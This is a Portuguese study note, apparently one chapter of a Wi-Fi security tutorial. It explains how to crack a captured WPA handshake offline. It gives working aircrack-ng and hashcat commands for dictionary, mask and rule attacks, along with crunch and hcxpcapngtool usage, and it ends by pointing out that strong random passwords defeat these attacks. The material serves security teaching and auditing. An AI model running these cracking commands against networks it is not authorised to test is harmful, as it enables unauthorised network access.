# 05 — Quebrar a senha (offline)

[[00-INDICE|⬅ Voltar ao índice]]

> [!important] Tudo aqui é OFFLINE
> Depois de capturar o handshake você não precisa mais estar perto da rede. O ataque é só “adivinhação”: testar palavras de uma lista contra o handshake até bater.

## Opção A — aircrack-ng (CPU, simples)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 captura-01.cap
```

- `-w` — wordlist (lista de senhas)
- `-b` — BSSID do alvo

Se achar: `KEY FOUND! [ senha123 ]`.

## Opção B — hashcat (GPU, muito mais rápido)

Primeiro converta o `.cap` para o formato do hashcat (`.hc22000`):

```bash
# Ferramenta moderna (pacote hcxtools)
hcxpcapngtool -o hash.hc22000 captura-01.cap
```

Depois quebre (modo 22000 = WPA-PMKID/EAPOL):

```bash
# Ataque de dicionário
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Ataque por máscara (ex.: 8 dígitos numéricos)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Ver resultado
hashcat -m 22000 hash.hc22000 --show
```

## Wordlists

| Lista | Onde | Nota |
|-------|------|------|
| **rockyou.txt** | `/usr/share/wordlists/rockyou.txt` | Clássica (pode estar `.gz`: `gunzip rockyou.txt.gz`) |
| SecLists | `apt install seclists` | Coleção enorme |
| Geradas | `crunch` | Para padrões específicos |

### Gerar wordlist com crunch

```bash
# 8 caracteres, só números
crunch 8 8 0123456789 -o numeros8.txt
```

### Regras (mutações) no hashcat

```bash
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> [!note] Realidade
> Senha **forte e aleatória** (16+ caracteres, sem palavra de dicionário) é **inviável** de quebrar por dicionário/força bruta no tempo de uma vida. A “quebra” só funciona contra senhas fracas/previsíveis. Essa é a lição de defesa — ver [[09-defesa]].
